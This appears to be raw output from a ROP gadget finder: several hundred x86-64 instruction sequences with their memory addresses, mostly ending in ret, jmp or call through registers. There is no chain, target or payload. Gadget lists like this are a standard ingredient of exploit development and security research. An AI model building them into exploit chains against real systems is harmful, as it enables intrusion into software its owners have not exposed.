0x00002aaaaac19abb : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac192ab : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rcx - 0x7cb80000], cl ; ret 0xeb10
0x00002aaaaac196ab : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi + rax - 0x7cb80000], cl ; ret 0xeb10
0x00002aaaaac19b8b : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rax - 0x7cb80000], ch ; ret 0xeb10
0x00002aaaaac1937b : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac1941d : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx], bl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1977b : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi + rax - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac199eb : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rsp + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac19441 : add al, 0x16 ; sbb cl, byte ptr [rdi] ; xchg dh, dh ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab73a01 : add al, 0x17 ; movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x00002aaaaab5f57a : add al, 0x17 ; sub eax, ecx ; ret
0x00002aaaaac6d328 : add al, 0x20 ; cmc ; dec dword ptr [rsp + 0x21040001] ; cmc ; jmp rsp
0x00002aaaaac6d330 : add al, 0x21 ; cmc ; jmp rsp
0x00002aaaaac0ed8a : add al, 0x24 ; add al, byte ptr [rax] ; add byte ptr [rax], al ; mov rdi, rsp ; call rdx
0x00002aaaaabebbcd : add al, 0x24 ; add byte ptr [rax - 0x76b80000], al ; ret 0x4875
0x00002aaaaab9e15f : add al, 0x24 ; add byte ptr [rax - 0x7af10000], al ; ret
0x00002aaaaab6b130 : add al, 0x24 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaab93635 : add al, 0x24 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0xbe606
0x00002aaaaaba06c1 : add al, 0x24 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabcad5d : add al, 0x24 ; add rsp, 0x18 ; ret
0x00002aaaaab441b1 : add al, 0x24 ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabde7b4 : add al, 0x24 ; add rsp, 0x38 ; ret
0x00002aaaaabde815 : add al, 0x24 ; add rsp, 0x40 ; ret
0x00002aaaaab1b98a : add al, 0x24 ; and byte ptr [rax - 0x77], cl ; ret 0x8949
0x00002aaaaab5d9e1 : add al, 0x24 ; call qword ptr [rdx]
0x00002aaaaac6e8d8 : add al, 0x24 ; clc ; inc esp ; salc ; add dword ptr [rax], eax ; xchg eax, esp ; and al, 0xf8 ; jmp rsp
0x00002aaaaabc4103 : add al, 0x24 ; je 0xef0e5 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab80ac3 : add al, 0x24 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac03812 : add al, 0x24 ; mov rdx, rbx ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaabe2ad0 : add al, 0x24 ; or cl, byte ptr [rcx - 0x77] ; fmul qword ptr [rcx + 0x29] ; fisttp word ptr [rax - 0x77] ; ret
0x00002aaaaabbed9a : add al, 0x25 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00002aaaaaaf5bea : add al, 0x25 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaabdb823 : add al, 0x25 ; rol byte ptr [rdx], 1 ; add byte ptr [rax], al ; pop rax ; pop rdi ; call rax
0x00002aaaaaba1675 : add al, 0x25 ; rol byte ptr [rdx], 1 ; add byte ptr [rax], al ; ret
0x00002aaaaaaf5b87 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 0x28 ; jmp rax
0x00002aaaaab61ca6 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; jmp rax
0x00002aaaaaaf584c : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00002aaaaab0a321 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; jmp rax
0x00002aaaaab0f5f2 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr fs:[rbp], rdx ; call rax
0x00002aaaaab046d2 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rdi, r13 ; call rax
0x00002aaaaabe9c79 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; test rax, rax ; je 0x114cbb ; call rax
0x00002aaaaab22397 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; xor esi, esi ; call rax
0x00002aaaaaaff21d : add al, 0x29 ; ret 0x8941
0x00002aaaaab7e069 : add al, 0x30 ; in eax, dx ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab7e07b : add al, 0x30 ; in eax, dx ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaabb2795 : add al, 0x31 ; rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x00002aaaaab61a3e : add al, 0x31 ; ret
0x00002aaaaabf6624 : add al, 0x31 ; ror byte ptr [rax - 0x7d], 0xc4 ; sub byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac7363c : add al, 0x37 ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaab6193a : add al, 0x37 ; ret
0x00002aaaaabca03d : add al, 0x39 ; ret
0x00002aaaaababdef : add al, 0x39 ; ret 0xec7f
0x00002aaaaab47d5f : add al, 0x3a ; ret
0x00002aaaaab7ff72 : add al, 0x3b ; add al, 0xf ; test dword ptr [rcx + rax], esi ; add byte ptr [rax], al ; ret
0x00002aaaaab6b7a4 : add al, 0x3c ; cmp eax, 0x89482e75 ; clc ; pop rbx ; ret
0x00002aaaaab31464 : add al, 0x41 ; cmp ah, 0x49 ; cmove esi, ecx ; jmp 0x5c439
0x00002aaaaab80d66 : add al, 0x41 ; mov dword ptr [rcx + 8], esi ; ret
0x00002aaaaac579bb : add al, 0x44 ; mov r10d, 0xcac982a4 ; call 0xffffffffaedac841
0x00002aaaaac7b0c0 : add al, 0x45 ; mov word ptr [rip + 0x3068345], es ; mov byte ptr [rcx], al ; ret
0x00002aaaaab72da6 : add al, 0x48 ; add edi, 5 ; mov dword ptr [rdi - 5], eax ; mov rax, rdi ; ret
0x00002aaaaab72d30 : add al, 0x48 ; add edi, 6 ; mov dword ptr [rdi - 6], eax ; mov rax, rdi ; ret
0x00002aaaaaaf58f2 : add al, 0x48 ; add edi, ebp ; call rax
0x00002aaaaac03006 : add al, 0x48 ; add esp, 0x10 ; mov eax, 1 ; pop rbx ; ret
0x00002aaaaab7ee17 : add al, 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabca073 : add al, 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab72ef5 : add al, 0x48 ; lea eax, dword ptr [rdi + 5] ; ret
0x00002aaaaab72f05 : add al, 0x48 ; lea eax, dword ptr [rdi + 6] ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab7c60b : add al, 0x48 ; lea eax, dword ptr [rdi + 6] ; ret
0x00002aaaaab72ea5 : add al, 0x48 ; lea eax, dword ptr [rdi + 7] ; ret
0x00002aaaaabf859e : add al, 0x48 ; lea eax, dword ptr [rdi + rsi + 8] ; ret
0x00002aaaaac3f459 : add al, 0x48 ; lea eax, dword ptr [rdx + 4] ; ret
0x00002aaaaac3f46b : add al, 0x48 ; lea eax, dword ptr [rdx + 5] ; ret
0x00002aaaaac3cf3a : add al, 0x48 ; lea ecx, dword ptr [rdx + 4] ; jne 0x16823b ; ret
0x00002aaaaab7aa27 : add al, 0x48 ; lea edi, dword ptr [rdi + 4] ; jne 0xa628b ; ret
0x00002aaaaab7c0cb : add al, 0x48 ; lea edi, dword ptr [rdi + 4] ; jne 0xa7a9b ; ret
0x00002aaaaab47163 : add al, 0x48 ; mov dword ptr [rax], ecx ; mov eax, dword ptr [rdx] ; pop rbx ; ret
0x00002aaaaab455c8 : add al, 0x48 ; mov dword ptr [rax], ecx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab470a3 : add al, 0x48 ; mov dword ptr [rax], edx ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaab19c8f : add al, 0x48 ; mov dword ptr [rbp], ebx ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0b35e : add al, 0x48 ; mov dword ptr [rbx], eax ; xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaac2f8ba : add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab460cc : add al, 0x48 ; mov dword ptr [rdx + 0x20], eax ; mov dword ptr [rcx], edi ; mov eax, edi ; ret
0x00002aaaaab46272 : add al, 0x48 ; mov dword ptr [rdx + 0x20], esi ; mov dword ptr [rcx], eax ; ret
0x00002aaaaab46f84 : add al, 0x48 ; mov dword ptr [rdx], ecx ; mov edx, dword ptr [rax] ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab72e65 : add al, 0x48 ; mov eax, edi ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab72df5 : add al, 0x48 ; mov eax, edi ; ret
0x00002aaaaac2f8b3 : add al, 0x48 ; mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab5fd14 : add al, 0x48 ; xor eax, eax ; ret
0x00002aaaaab1f498 : add al, 0x4c ; cmp edi, eax ; jbe 0x4a49a ; nop ; pop rbx ; ret
0x00002aaaaab81570 : add al, 0x4c ; lea ecx, dword ptr [rsp + 0x20] ; call rbx
0x00002aaaaac84e3c : add al, 0x4f ; add dword ptr [rax], eax ; and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaabe8e34 : add al, 0x50 ; shr ax, 0xe ; and eax, 1 ; ret
0x00002aaaaac5d624 : add al, 0x52 ; hlt ; dec dword ptr [rsi] ; push rdx ; hlt ; lcall ptr [rax] ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaaaf4c05 : add al, 0x5b ; pop rbp ; pop r12 ; ret
0x00002aaaaac3f467 : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; lea rax, qword ptr [rdx + 5] ; ret
0x00002aaaaab76f4c : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x00002aaaaab0a12d : add al, 0x66 ; nop ; fstp st(1) ; add rsp, 8 ; ret
0x00002aaaaac8f157 : add al, 0x66 ; ret
0x00002aaaaac6eaa8 : add al, 0x68 ; clc ; inc dword ptr [rbp + 0x69340001] ; clc ; call rsp
0x00002aaaaac7b6b7 : add al, 0x71 ; ret
0x00002aaaaaafeae2 : add al, 0x72 ; jns 0x29d4cced ; ret
0x00002aaaaab02a7d : add al, 0x72 ; or bl, dh ; ret
0x00002aaaaac6c1a8 : add al, 0x72 ; out dx, al ; call rsp
0x00002aaaaac7d1a7 : add al, 0x72 ; ret
0x00002aaaaab568d4 : add al, 0x74 ; and al, 0x89 ; ret 0xb48b
0x00002aaaaab80d64 : add al, 0x75 ; add al, 0x41 ; mov dword ptr [rcx + 8], esi ; ret
0x00002aaaaaba4054 : add al, 0x75 ; jae 0xcf070 ; mov dh, 0x42 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaabb955a : add al, 0x75 ; mov bl, 0x8b ; pop rax ; or bh, dh ; ret
0x00002aaaaab804a2 : add al, 0x75 ; ret
0x00002aaaaabebfc5 : add al, 0x75 ; test eax, 0x48f88948 ; add esp, 8 ; ret
0x00002aaaaac6b920 : add al, 0x77 ; in eax, dx ; jmp rsp
0x00002aaaaab5a987 : add al, 0x77 ; or dword ptr [rcx - 0x7d], ecx ; ret 0xe977
0x00002aaaaabcf9b2 : add al, 0x77 ; or esp, dword ptr [rsi - 0x77] ; push rsi ; xor ax, ax ; ret
0x00002aaaaab02e30 : add al, 0x78 ; and ax, 0x100 ; movzx eax, ax ; ret
0x00002aaaaab02e50 : add al, 0x78 ; and ax, 0x1000 ; movzx eax, ax ; ret
0x00002aaaaab02d90 : add al, 0x78 ; and ax, 0x200 ; movzx eax, ax ; ret
0x00002aaaaab02e10 : add al, 0x78 ; and ax, 0x2000 ; movzx eax, ax ; ret
0x00002aaaaab02d30 : add al, 0x78 ; and ax, 0x400 ; movzx eax, ax ; ret
0x00002aaaaab02dd0 : add al, 0x78 ; and ax, 0x4000 ; movzx eax, ax ; ret
0x00002aaaaab02d70 : add al, 0x78 ; and ax, 0x800 ; movzx eax, ax ; ret
0x00002aaaaab02db0 : add al, 0x78 ; and ax, 0x8000 ; movzx eax, ax ; ret
0x00002aaaaab02ed0 : add al, 0x78 ; and eax, 1 ; ret
0x00002aaaaab02d50 : add al, 0x78 ; and eax, 2 ; movzx eax, ax ; ret
0x00002aaaaab02df0 : add al, 0x78 ; and eax, 4 ; movzx eax, ax ; ret
0x00002aaaaab02d10 : add al, 0x78 ; and eax, 8 ; movzx eax, ax ; ret
0x00002aaaaac6c1f8 : add al, 0x78 ; out dx, al ; call rsp
0x00002aaaaac6a400 : add al, 0x79 ; cld ; push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaac78577 : add al, 0x79 ; ret
0x00002aaaaac7b5df : add al, 0x7b ; ret
0x00002aaaaac4867b : add al, 0x7e ; mov rbx, qword ptr [rdi + 0x10] ; call 0x1f8b1
0x00002aaaaab38886 : add al, 0x81 ; add rcx, rax ; jmp rcx
0x00002aaaaab7f213 : add al, 0x81 ; je 0xaa1f5 ; ret
0x00002aaaaac1b0fb : add al, 0x81 ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00002aaaaab7f20f : add al, 0x81 ; sub eax, dword ptr [rcx + r8*4] ; je 0xaa1f9 ; ret
0x00002aaaaac1c9d3 : add al, 0x81 ; sub eax, edx ; ret
0x00002aaaaab72d19 : add al, 0x82 ; add r10, rax ; jmp r10
0x00002aaaaab976aa : add al, 0x82 ; add rdx, r8 ; jmp rdx
0x00002aaaaaaf60b5 : add al, 0x82 ; add rdx, rax ; jmp rdx
0x00002aaaaab7f1c8 : add al, 0x82 ; sub eax, dword ptr [rdx + rcx*4] ; je 0xaa1b8 ; ret
0x00002aaaaab660c7 : add al, 0x82 ; sub eax, ecx ; ret
0x00002aaaaab8e771 : add al, 0x83 ; adc byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaaafb483 : add al, 0x83 ; cli ; add dword ptr [rax + 0x19], ecx ; ror byte ptr [rax - 0x7d], cl ; ret 0x4906
0x00002aaaaab4a9b2 : add al, 0x83 ; loop 0x759bd ; mov eax, edx ; ret
0x00002aaaaab4cf04 : add al, 0x83 ; loopne 0x77f0d ; ret
0x00002aaaaab828bb : add al, 0x83 ; ret 0x4101
0x00002aaaaabb03e2 : add al, 0x83 ; ret 0x4801
0x00002aaaaab0ad5b : add al, 0x83 ; ret 0xf701
0x00002aaaaabecaa9 : add al, 0x84 ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov edx, dword ptr [rbx] ; jmp 0x117a7e
0x00002aaaaabb2ed8 : add al, 0x85 ; fisttp dword ptr [rcx + 0x7e10245c] ; ret 0x8b48
0x00002aaaaab7f262 : add al, 0x85 ; leave ; mov dword ptr [rdx], ecx ; jne 0xaa260 ; ret
0x00002aaaaab80d9e : add al, 0x85 ; ror byte ptr [rcx - 0xc0c8af0], cl ; ret
0x00002aaaaab81f19 : add al, 0x85 ; sal byte ptr [rbp - 0xe], cl ; ret
0x00002aaaaab03bb9 : add al, 0x86 ; add rax, r14 ; jmp rax
0x00002aaaaab411d4 : add al, 0x86 ; add rax, rsi ; jmp rax
0x00002aaaaab41303 : add al, 0x86 ; add rsi, rax ; jmp rsi
0x00002aaaaabdf0e2 : add al, 0x86 ; mov eax, dword ptr [rax + rdx] ; shr eax, cl ; and eax, 1 ; ret
0x00002aaaaaba8403 : add al, 0x87 ; add rax, rdi ; jmp rax
0x00002aaaaab80a6e : add al, 0x87 ; test r8d, r8d ; jne 0xaba48 ; ret
0x00002aaaaac3f456 : add al, 0x88 ; add al, 0x48 ; lea eax, dword ptr [rdx + 4] ; ret
0x00002aaaaab76f2b : add al, 0x88 ; add al, 0x48 ; mov eax, edi ; ret
0x00002aaaaab0e18a : add al, 0x89 ; add ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab72d97 : add al, 0x89 ; cld ; mov rax, rdi ; ret
0x00002aaaaab7e064 : add al, 0x89 ; js 0xffffffffed3a94ce ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab2a6a1 : add al, 0x89 ; ret 0x2944
0x00002aaaaab72de2 : add al, 0x8a ; add r10, rax ; jmp r10
0x00002aaaaab7f1cb : add al, 0x8a ; je 0xaa1b5 ; ret
0x00002aaaaab76f14 : add al, 0x8b ; add dword ptr [rcx - 0x776b7fe], ecx ; ret
0x00002aaaaaafba16 : add al, 0x8b ; and al, 0x14 ; jmp 0x26833
0x00002aaaaabcaf07 : add al, 0x8b ; and al, 0xc ; add rsp, 0x18 ; ret
0x00002aaaaab80a58 : add al, 0x8b ; or al, byte ptr [rbp - 0xc0e8a37] ; ret
0x00002aaaaab29d40 : add al, 0x8b ; or byte ptr [rax - 0x7d], cl ; ret 0x8504
0x00002aaaaabb2e92 : add al, 0x8d ; add dword ptr [r8 - 0x7d], ecx ; ret
0x00002aaaaab1239d : add al, 0x8d ; push rcx ; rol byte ptr [rax - 0x6df0f506], 1 ; ret 0xb60f
0x00002aaaaac7c2b0 : add al, 0x8e ; add ecx, dword ptr [rdi + 0x380e4402] ; ret
0x00002aaaaac7b3b6 : add al, 0x8e ; add ecx, dword ptr [rdi + 0x80e6a02] ; ret
0x00002aaaaac8fa1b : add al, 0x8e ; add ecx, dword ptr [rdi + 0x80e7002] ; ret
0x00002aaaaab038ef : add al, 0x8e ; add rsi, rax ; jmp rsi
0x00002aaaaab20604 : add al, 0x90 ; add rax, rdi ; jmp rax
0x00002aaaaac6ccc8 : add al, 0x90 ; jmp rsp
0x00002aaaaac6c5e8 : add al, 0x92 ; out dx, eax ; jmp rsp
0x00002aaaaabdef97 : add al, 0xa ; ret
0x00002aaaaac6b720 : add al, 0xa6 ; jmp 0x196726
0x00002aaaaabdda34 : add al, 0xa8 ; sub eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaaad7315 : add al, 0xaa ; ret
0x00002aaaaab02a66 : add al, 0xb7 ; mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaac105a3 : add al, 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab030b8 : add al, 0xb8 ; ret
0x00002aaaaab7f019 : add al, 0xbe ; add rsi, rax ; jmp rsi
0x00002aaaaac021c9 : add al, 0xc2 ; jmp rax
0x00002aaaaab80c8b : add al, 0xc3 ; nop dword ptr [rax] ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaabf8572 : add al, 0xc3 ; nop dword ptr [rax] ; mov eax, 0xffffffff ; ret
0x00002aaaaab0af24 : add al, 0xcf ; setne al ; movzx eax, al ; ret
0x00002aaaaab9bdd3 : add al, 0xd0 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab250dc : add al, 0xd1 ; add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaac6f2a8 : add al, 0xd1 ; stc ; call rsp
0x00002aaaaab0af67 : add al, 0xd7 ; xor eax, eax ; ret
0x00002aaaaab1d38d : add al, 0xde ; lea r9, qword ptr [rdx] ; jmp 0x483e9
0x00002aaaaab1ef6d : add al, 0xde ; lea r9, qword ptr [rdx] ; jmp 0x49fc9
0x00002aaaaab7bf47 : add al, 0xe ; add byte ptr [rbx + 0x63], cl ; or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab7bf14 : add al, 0xe ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaabe37d8 : add al, 0xe8 ; ret 0xf110
0x00002aaaaac6b149 : add al, 0xea ; call rsp
0x00002aaaaab02d35 : add al, 0xf ; mov bh, 0xc0 ; ret
0x00002aaaaac1920d : add al, 0xf ; movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x00002aaaaac1ea7b : add al, 0xf ; sub rax, r8 ; ret
0x00002aaaaabac099 : add al, 0xf ; test ah, al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4c04
0x00002aaaaab3b3b6 : add al, 0xf ; test byte ptr [rbp - 0x7cfffffe], ah ; ret 0x3901
0x00002aaaaabc50ca : add al, 0xf ; test byte ptr [rbx - 0x76000004], ah ; ret 0xdb31
0x00002aaaaabc531c : add al, 0xf ; test byte ptr [rip - 0x7a000001], ah ; fisttp dword ptr [rdi] ; xchg eax, ebp ; ret
0x00002aaaaababbb7 : add al, 0xf ; test dword ptr [rax], eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8341
0x00002aaaaab7ff75 : add al, 0xf ; test dword ptr [rcx + rax], esi ; add byte ptr [rax], al ; ret
0x00002aaaaab7aa2b : add al, 0xf ; test dword ptr [rsi + 8], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaabb8a03 : add al, 0xf ; test eax, edx ; add byte ptr [rax], al ; add dh, dh ; ret 0x7408
0x00002aaaaabd1f29 : add al, 0xf ; xchg eax, ebp ; ret 0xdaf7
0x00002aaaaabb8379 : add al, 0xf ; xchg eax, esp ; ret 0x9848
0x00002aaaaab1d1c8 : add al, 0xf0 ; mov qword ptr [rcx + rsi*8], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab00020 : add al, 0xf0 ; test rax, rax ; je 0x2b030 ; call rax
0x00002aaaaab1d1cc : add al, 0xf1 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac5c4a5 : add al, 0xf2 ; call rax
0x00002aaaaac5c4b1 : add al, 0xf2 ; inc dword ptr [rax] ; add eax, 0x510fff2 ; jmp qword ptr [rax]
0x00002aaaaac5c4a1 : add al, 0xf2 ; inc eax ; add al, 0xf2 ; call rax
0x00002aaaaac5c485 : add al, 0xf2 ; inc eax ; add al, 0xf2 ; jmp rax
0x00002aaaaac5c471 : add al, 0xf2 ; jmp qword ptr [rax]
0x00002aaaaac5c489 : add al, 0xf2 ; jmp rax
0x00002aaaaac2fc23 : add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaab4045b : add al, 0xf3 ; ret
0x00002aaaaac5dde5 : add al, 0xf5 ; lcall ptr [rax] ; add eax, 0x518fff5 ; cmc ; jmp rax
0x00002aaaaab63839 : add al, 0xf6 ; ret 0x7408
0x00002aaaaac6c6c0 : add al, 0xf7 ; out dx, eax ; inc dword ptr [rax + rcx - 0x4cbffff] ; out dx, eax ; call rsp
0x00002aaaaac69225 : add al, 0xfb ; jmp rax
0x00002aaaaab0433d : add al, 0xff ; dec dword ptr [rax - 0x77] ; ret 0x8548
0x00002aaaaac067e2 : add al, 1 ; add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x00002aaaaabf7cdb : add al, 1 ; add byte ptr [rax], al ; cmove eax, edx ; ret
0x00002aaaaab7ffa8 : add al, 1 ; add byte ptr [rax], al ; ret
0x00002aaaaac803d5 : add al, 1 ; add byte ptr [rax], bl ; call rcx
0x00002aaaaac6c615 : add al, 1 ; add byte ptr [rsp + rdx*4], dh ; out dx, eax ; call rsp
0x00002aaaaab31b58 : add al, 1 ; add dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x00002aaaaabaa058 : add al, 1 ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabaa043 : add al, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab40419 : add al, 1 ; ret
0x00002aaaaab4047a : add al, 1 ; xor eax, eax ; ret
0x00002aaaaac7844f : add al, 2 ; hlt ; ret
0x00002aaaaac80dff : add al, 2 ; jle 0x1abe11 ; ret
0x00002aaaaab738ec : add al, 3 ; add byte ptr [rax - 0x77], cl ; fisttp word ptr [rax - 0x77] ; ret 0xc6e8
0x00002aaaaac41378 : add al, 3 ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac43b47 : add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac29306 : add al, 4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaaad54b7 : add al, 4 ; ret 0x6080
0x00002aaaaabacdd2 : add al, 6 ; add dword ptr [rbx - 0x7cb7fe40], eax ; ret 0x4801
0x00002aaaaab7ab78 : add al, 7 ; add byte ptr [rax], al ; ret
0x00002aaaaab5df4d : add al, 7 ; cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x00002aaaaaba95b1 : add al, 7 ; mov r12, rdi ; xor eax, eax ; mov rdx, r8 ; jmp 0xd45e0
0x00002aaaaab6abf8 : add al, 7 ; ret
0x00002aaaaab72fcf : add al, 7 ; test r8b, r8b ; jne 0x9dfb8 ; ret
0x00002aaaaab4c403 : add al, 8 ; add byte ptr [rax], al ; ret
0x00002aaaaac6d188 : add al, 8 ; hlt ; call rsp
0x00002aaaaabde887 : add al, 8 ; mov ecx, edi ; shr eax, cl ; and eax, 1 ; ret
0x00002aaaaab73b6f : add al, 8 ; movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x00002aaaaac7f06f : add al, ah ; adc al, 0xf2 ; call qword ptr [rdx]
0x00002aaaaac7b7cf : add al, ah ; add edi, ebp ; jmp rsi
0x00002aaaaac86fff : add al, ah ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac8d7bf : add al, ah ; fdiv st(7) ; jmp rdi
0x00002aaaaac7107f : add al, ah ; in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaac8510f : add al, ah ; jb 0x1b010c ; jmp qword ptr [rcx]
0x00002aaaaac7236f : add al, ah ; jl 0x19d360 ; call qword ptr [rcx]
0x00002aaaaac7ad7f : add al, ah ; mov dh, ch ; call qword ptr [rsi]
0x00002aaaaac7adaf : add al, ah ; mov dh, ch ; jmp rbx
0x00002aaaaac81dbf : add al, ah ; nop ; hlt ; call qword ptr [rcx]
0x00002aaaaac90ac9 : add al, ah ; or ch, byte ptr [rsi] ; ret 0xb
0x00002aaaaac90b21 : add al, ah ; or dword ptr [rsi], ebp ; ret 0xa
0x00002aaaaac84ecf : add al, ah ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8472f : add al, ah ; push rbx ; cmc ; call qword ptr [rdx]
0x00002aaaaaaddd4f : add al, ah ; ret
0x00002aaaaac81c0f : add al, ah ; stc ; call qword ptr [rax]
0x00002aaaaac73aff : add al, ah ; xor al, 0xea ; jmp rax
0x00002aaaaac8ef1f : add al, al ; adc bh, al ; jmp qword ptr [rbx]
0x00002aaaaac7917f : add al, al ; add bh, ch ; jmp rsp
0x00002aaaaac7f40f : add al, al ; and dh, dl ; jmp qword ptr [rcx]
0x00002aaaaac86dbf : add al, al ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaabed7dd : add al, al ; cmp edx, 0x80000000 ; cmovne eax, edi ; ret
0x00002aaaaac84b8f : add al, al ; insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8504f : add al, al ; jno 0x1b004c ; jmp qword ptr [rcx]
0x00002aaaaac729bf : add al, al ; mov ebp, ecx ; jmp rsp
0x00002aaaaac84ddf : add al, al ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac5b45f : add al, al ; pop rcx ; out dx, al ; jmp rax
0x00002aaaaac8495f : add al, al ; pop rdx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac89acf : add al, al ; ret
0x00002aaaaac51827 : add al, al ; sldt word ptr [rax] ; ret
0x00002aaaaac7a30f : add al, al ; sub esi, ebp ; jmp qword ptr [rdi]
0x00002aaaaac87017 : add al, bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac5a517 : add al, bh ; loope 0x18551e ; jmp qword ptr [rdi]
0x00002aaaaac5a597 : add al, bh ; loope 0x18559e ; jmp qword ptr [rdi]
0x00002aaaaac5a617 : add al, bh ; loope 0x18561e ; jmp qword ptr [rdi]
0x00002aaaaac72997 : add al, bh ; mov cl, ch ; jmp rsp
0x00002aaaaac84ee7 : add al, bh ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
